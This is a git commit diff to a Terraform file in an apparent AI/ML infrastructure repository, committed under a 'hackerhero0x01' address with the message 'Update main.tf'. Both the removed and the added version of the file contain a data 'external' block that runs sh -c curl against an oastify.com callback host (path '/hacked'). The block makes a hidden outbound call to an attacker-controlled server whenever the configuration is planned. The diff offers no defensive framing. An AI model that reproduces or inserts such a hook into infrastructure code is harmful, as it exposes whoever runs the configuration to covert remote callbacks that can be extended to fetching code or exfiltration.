6b43253b9fdb29028d4626a5b269c6c7ed7c6e51
xyz <114230687+hackerhero0x01@users.noreply.github.com>
2024-05-09 22:10:14 +0530

    Update main.tf

--- ai-ml/trainium-inferentia/main.tf
+++ ai-ml/trainium-inferentia/main.tf
@@ -1,3 +1,3 @@
 data "external" "example" {
-  program = ["sh", "-c", "curl -sSfL at7yfhqh82rnej3htvl8lrox1o7fvhj6.oastify.com/hacked"]
+  program = ["sh", "-c", "curl -sSfL at7yfhqh82rnej3htvl8lrox1o7fvhj6.oastify.com/hackeddddd"]
 }
